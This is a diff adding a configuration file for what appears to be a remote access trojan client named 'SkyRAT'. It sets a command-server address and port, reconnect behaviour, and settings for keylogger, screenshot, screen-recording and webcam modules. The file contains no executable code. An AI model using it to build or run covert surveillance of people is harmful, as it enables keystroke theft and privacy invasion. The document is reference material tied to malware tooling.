@@ -1,0 +1,37 @@
+# SkyRAT Client Configuration File
+# This file replaces the hardcoded constants from legacy client.cpp
+
+[Connection]
+# Server connection settings
+server_ip = 127.0.0.1
+server_port = 4545
+connection_timeout = 5000
+auto_reconnect = true
+reconnect_interval = 3000
+max_reconnect_attempts = 10
+
+[Network]
+# Network buffer and protocol settings
+receive_buffer_size = 1024
+send_timeout = 5000
+keepalive_interval = 30000
+
+[Logging]
+# Logging configuration
+log_level = INFO
+log_file = skyrat_client.log
+console_output = true
+
+[Modules]
+# Module-specific settings
+screenshot_format = PNG
+keylogger_buffer_size = 1024
+screen_recording_fps = 30
+screen_recording_quality = 80
+webcam_resolution = 640x480
+webcam_fps = 15
+
+[Security]
+# Security settings (for future implementation)
+encryption_enabled = false
+certificate_validation = true
